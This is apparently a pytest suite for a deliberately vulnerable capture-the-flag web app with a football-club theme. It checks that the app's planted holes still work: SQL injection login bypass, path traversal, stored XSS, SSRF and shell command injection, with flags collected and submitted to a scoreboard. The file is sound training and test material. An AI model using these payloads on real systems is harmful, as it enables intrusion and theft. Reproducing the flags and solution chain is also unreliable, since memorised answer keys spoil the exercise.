from __future__ import annotations

import re
from pathlib import Path

import pytest

from tests.cmd import WebClient, run_app_server

RESET_PHRASE = 'RESET PITCH-VULNERABLE'
ROOT_DIR = Path(__file__).resolve().parents[1]
PASSWD_FIXTURE = ROOT_DIR / 'wasm-vulnerable-app' / 'fake_etc' / 'passwd'
EXPECTED_PASSWD = PASSWD_FIXTURE.read_text(encoding='utf-8').strip()
XSS_PAYLOAD = "<script>document.body.innerHTML=document.body.innerHTML.replace(/Blackfield/gi,'');</script>"


@pytest.fixture(scope='session')
def base_url():
    with run_app_server() as url:
        yield url


@pytest.fixture()
def client(base_url):
    c = WebClient(base_url)
    reset_state(c)
    return c


def reset_state(client: WebClient) -> None:
    response = client.request(
        '/reset.php',
        method='POST',
        data={
            'confirm_phrase': RESET_PHRASE,
            'confirm_ack': 'yes',
        },
    )
    assert response.status == 200
    assert 'Reset completed' in response.body


def test_reset_requires_confirmation(base_url):
    c = WebClient(base_url)
    response = c.request('/reset.php', method='POST', data={'confirm_phrase': 'RESET'})
    assert response.status == 200
    assert 'Invalid confirmation' in response.body


def test_sqli_login_bypass_and_data_leak(client):
    response = client.request(
        '/login.php',
        method='POST',
        data={'username': 'admin', 'password': "' OR '1'='1"},
    )
    assert response.status == 200
    assert 'Logged in as admin (admin)' in response.body
    assert 'S9_BoxHunter#9' in response.body


def test_lfi_path_traversal_reads_secret_file(client):
    response = client.request('/index.php?page=../../uploads/secret_data/scouting_report.txt')
    assert response.status == 200
    assert 'LFI{blackfield_traversal_success}' in response.body


def test_stored_xss_persists_unescaped(client):
    response = client.request(
        '/winners.php',
        method='POST',
        data={'author': 'pytest', 'message': XSS_PAYLOAD},
    )
    assert response.status == 200

    page = client.request('/winners.php')
    assert page.status == 200
    assert XSS_PAYLOAD in page.body
    assert '&lt;script&gt;' not in page.body


def test_ssrf_preview_reaches_internal_service(client, base_url):
    response = client.request(
        '/index.php',
        method='POST',
        data={'preview_url': f'{base_url}/admin_service.php?action=flag'},
    )
    assert response.status == 200
    assert 'Club internal admin service' in response.body
    assert 'SSRF{localhost_admin_service_unlocked}' in response.body


def test_admin_service_direct_access_is_denied(client):
    response = client.request('/admin_service.php?action=flag')
    assert response.status == 403
    assert 'internal service token required' in response.body.lower()


def test_hidden_ping_requires_authentication(base_url):
    c = WebClient(base_url)
    response = c.request('/hidden.php')
    assert response.status == 200
    assert 'Club Member Area' in response.body


def test_authenticated_command_injection_discloses_secret(client):
    login = client.request(
        '/login.php',
        method='POST',
        data={'username': 'admin', 'password': "' OR '1'='1"},
    )
    assert login.status == 200

    response = client.request(
        '/hidden.php',
        method='POST',
        data={'target': '127.0.0.1; cat ../uploads/.secret/reverse_shell_secret.flag'},
    )
    assert response.status == 200
    assert 'RCE{ping_the_world_compromised}' in response.body


def test_scoreboard_complete_all_quests(client, base_url):
    login = client.request(
        '/login.php',
        method='POST',
        data={'username': 'admin', 'password': "' OR '1'='1"},
    )
    assert login.status == 200

    match = re.search(r'<tr><td>striker</td><td>([^<]+)</td>', login.body)
    assert match, 'Password leak for striker not found'
    quest1_flag = match.group(1)

    lfi = client.request('/index.php?page=../../uploads/secret_data/scouting_report.txt')
    assert lfi.status == 200
    assert 'LFI{blackfield_traversal_success}' in lfi.body

    guestbook = client.request(
        '/winners.php',
        method='POST',
        data={'author': 'pytest-chain', 'message': XSS_PAYLOAD},
    )
    assert guestbook.status == 200

    ssrf = client.request(
        '/index.php',
        method='POST',
        data={'preview_url': f'{base_url}/admin_service.php?action=flag'},
    )
    assert ssrf.status == 200
    ssrf_match = re.search(r'SSRF\{[^}]+\}', ssrf.body)
    assert ssrf_match, 'SSRF flag not found in preview output'
    quest4_flag = ssrf_match.group(0)

    rce = client.request(
        '/hidden.php',
        method='POST',
        data={'target': '127.0.0.1; cat ../uploads/.secret/reverse_shell_secret.flag'},
    )
    assert rce.status == 200
    rce_match = re.search(r'RCE\{[^}]+\}', rce.body)
    assert rce_match, 'RCE flag not found in hidden ping output'
    quest5_flag = rce_match.group(0)

    submit1 = client.request('/scoreboard.php', method='POST', data={'quest_id': 'quest_1', 'answer': quest1_flag})
    assert 'Quest completed: quest_1' in submit1.body

    submit2 = client.request(
        '/scoreboard.php',
        method='POST',
        data={'quest_id': 'quest_2', 'answer': EXPECTED_PASSWD},
    )
    assert 'Quest completed: quest_2' in submit2.body

    submit3_fail = client.request(
        '/scoreboard.php',
        method='POST',
        data={'quest_id': 'quest_3', 'answer': ''},
    )
    assert 'Wrong flag or unmet condition.' in submit3_fail.body

    submit3 = client.request(
        '/scoreboard.php',
        method='POST',
        data={'quest_id': 'quest_3', 'answer': '', 'xss_probe': 'verified'},
    )
    assert 'Quest completed: quest_3' in submit3.body

    submit4 = client.request('/scoreboard.php', method='POST', data={'quest_id': 'quest_4', 'answer': quest4_flag})
    assert 'Quest completed: quest_4' in submit4.body

    submit5 = client.request('/scoreboard.php', method='POST', data={'quest_id': 'quest_5', 'answer': quest5_flag})
    assert 'Quest completed: quest_5' in submit5.body

    pick_team = client.request(
        '/scoreboard.php',
        method='POST',
        data={'ui_action': 'pick_team', 'champion_team': 'Coastline Blue'},
    )
    assert 'Theme updated for Coastline Blue.' in pick_team.body
    assert 'the next winner of the league is Coastline Blue' in pick_team.body

    final = client.request('/scoreboard.php')
    assert 'Progress: <strong>5/5</strong> quests solved.' in final.body
    assert 'League Champion Selector' in final.body
